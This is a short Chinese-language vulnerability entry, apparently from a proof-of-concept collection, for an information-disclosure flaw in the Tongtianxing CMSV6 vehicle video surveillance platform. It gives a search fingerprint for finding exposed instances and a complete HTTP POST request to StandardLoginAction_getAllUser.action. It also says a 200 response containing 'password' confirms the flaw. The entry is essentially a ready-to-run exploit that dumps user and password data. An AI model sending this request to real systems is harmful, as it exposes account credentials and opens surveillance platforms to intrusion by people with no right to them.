﻿# 通天星CMSV6 车载视频监控平台 信息泄露漏

> 更新时间：2024-02-26

> 漏洞编号：

> 漏洞说明：通天星CMSV6车载视频监控平台 StandardLoginAction getAlser.acion接口处存在信息泄露漏洞

> 漏洞特征：body="/808gps/"

> 验证脚本：HTTP

```
POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate

json=null
```

> 响应代码特征：200

> 响应内容特征：password

> 上传文件定位：

> 验证文件来源：通天星CMSV6 车载视频监控平台 信息泄露漏.poc